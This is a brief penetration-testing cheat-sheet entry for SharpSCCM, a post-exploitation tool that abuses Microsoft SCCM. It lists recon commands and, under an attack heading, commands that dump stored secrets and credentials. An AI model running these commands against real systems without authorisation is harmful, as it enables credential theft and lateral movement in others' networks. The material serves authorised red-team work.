# SharpSCCM

% sccm, mecm
#plateform/windows  #target/remote  

## _url
```
https://github.com/Mayyhem/SharpSCCM
```

## desc
```
SharpSCCM is a post-exploitation tool designed to leverage Microsoft Endpoint Configuration Manager (a.k.a. ConfigMgr, formerly SCCM) for credential gathering and lateral movement without requiring access to the SCCM administration console GUI.
```

## _links
```
https://github.com/Mayyhem/SharpSCCM/wiki
```

#cat/RECON

## local - site-info
```powershell
SharpSCCM.exe local site-info
```

## local - client-info
```powershell
SharpSCCM.exe local client-info
```

## local - user
```powershell
SharpSCCM.exe local user-sid
```

## get - retrieve admins
```powershell
SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p CollectionNames -p LogonName -p RoleNames
```

#cat/ATTACK 

## get - get secrets
```powershell
SharpSCCM.exe get secrets
```

## get - local secrets
```powershell
sharpsccm.exe local secrets -m wmi
```